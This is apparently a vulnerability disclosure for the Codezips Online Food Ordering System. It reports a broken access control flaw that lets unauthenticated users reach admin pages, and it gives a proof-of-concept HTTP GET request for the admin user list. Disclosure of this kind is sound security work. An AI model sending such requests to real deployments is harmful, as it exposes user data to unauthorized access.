# Broken Access Control in Online Food Ordering System


## Vendor and Product information:
* **Vendor:** Codezips
* **Product:** Online Food Ordering System
* **Product URL:** https://codeastro.com/online-food-ordering-system-in-php-mysql-with-source-code/

## Description
The Online Food Ordering System application has a Broken Access Control vulnerability, enabling an unauthenticated attacker to access restricted admin pages. This security flaw could result in unauthorized actions, exposure of sensitive information, or potential disruption of the system's functionality.

## Proof of Concept
**HTTP Request Example**
``` http request
GET /OnlineFood-PHP/admin/all_users.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/OnlineFood-PHP/admin/update_users.php?user_upd=7
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

## Screenshot
![image](https://github.com/user-attachments/assets/dabffc03-33ed-409c-ba96-cf606d41a220)



## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
